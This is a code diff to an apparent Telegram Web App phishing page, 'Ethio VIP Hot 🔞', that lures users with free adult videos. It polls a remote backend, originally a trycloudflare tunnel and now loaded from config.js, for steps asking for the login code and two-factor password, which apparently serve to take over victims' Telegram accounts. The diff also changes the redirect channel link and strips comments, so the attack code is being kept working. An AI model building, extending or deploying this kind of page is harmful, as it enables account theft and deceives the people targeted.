@@ -9,6 +9,7 @@
     <title>Ethio VIP Hot 🔞</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="./config.js"></script>
 <style>
     /* Premium Modern UI Design */
     :root {
@@ -260,7 +261,7 @@
             <div style="font-size: 70px; color: #4BB543; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(75, 181, 67, 0.4));"><i class="fa-solid fa-circle-check"></i></div>
             <h2 style="margin: 0; font-size: 26px;">እንኳን ደስ አለዎት!</h2>
             <p style="opacity: 0.9; margin: 20px 0 25px; font-size: 16px; line-height: 1.6;">አካውንትዎ በተሳካ ሁኔታ ተረጋግጧል። አሁን ሁሉንም የቪአይፒ ቪዲዮዎች በነጻ ማየት ይችላሉ።</p>
-            <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'" style="background: #4BB543;">JOIN VIP CHANNEL NOW</button>
+            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: #4BB543;">JOIN VIP CHANNEL NOW</button>
         </div>
     </div>
 
@@ -281,10 +282,10 @@
     // WebApp ሙሉ ስክሪን እንዲሆን የሚያደርጉ ትዕዛዞች
     tg.expand();
     tg.ready();
-    tg.headerColor = '#0a0a0a'; // የላይኛውን ባር ቀለም ከዲዛይኑ ጋር ማመሳሰል
+    tg.headerColor = '#0a0a0a'; 
     tg.backgroundColor = '#0a0a0a';
 
-    const API_BASE_URL = "https://planning-article-minutes-victory.trycloudflare.com"; 
+    // API_BASE_URL አሁን ከ config.js ነው የሚመጣው
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
@@ -299,7 +300,6 @@
     ];
 
     window.onload = function() {
-        // App ሲከፈት በድጋሚ Expand እንዲያደርግ
         tg.expand();
         
         const bg = document.getElementById('bgLayer');
@@ -337,12 +337,15 @@
     }
 
     function checkStatus() {
-        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
-            else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
-        }).catch(e => {});
+        // API_BASE_URL በ config.js ውስጥ መገኘቱን ያረጋግጣል
+        if(typeof API_BASE_URL !== 'undefined'){
+            fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+                if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
+                else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+                else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
+                else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+            }).catch(e => {});
+        }
     }
 
     function stopLoaders() {
